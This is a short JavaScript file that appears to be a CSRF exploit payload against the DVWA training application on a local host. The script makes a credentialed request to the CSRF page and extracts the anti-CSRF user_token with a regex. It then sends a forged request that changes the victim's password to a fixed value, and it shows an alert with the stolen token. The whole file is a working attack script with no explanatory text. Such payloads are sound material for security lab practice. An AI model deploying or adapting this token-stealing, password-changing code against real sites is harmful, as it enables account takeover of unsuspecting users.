var hostname = 'http://127.0.0.1:8080';
var the_url = hostname + '/vulnerabilities/csrf';
var pass = 'newpasswd123';
var regex = /user_token\' value\=\'(.*?)\' \/\>/;

if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.withCredentials = true;
var activated = false;
xmlhttp.onreadystatechange=function(){
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
    {
        var text = xmlhttp.responseText;
        var match = text.match(regex);
        var token = match[1];
        var new_url = the_url + '/?user_token=' + token + '&password_new=' + pass + '&password_conf=' + pass + '&Change=Change'
        if(!activated){
            alert('Token that was received: ' + match[1]);
	    activated = true;
            xmlhttp.open("GET", new_url, false );
            xmlhttp.send();
        }
    }
};
xmlhttp.open("GET", the_url, false );
xmlhttp.send(); 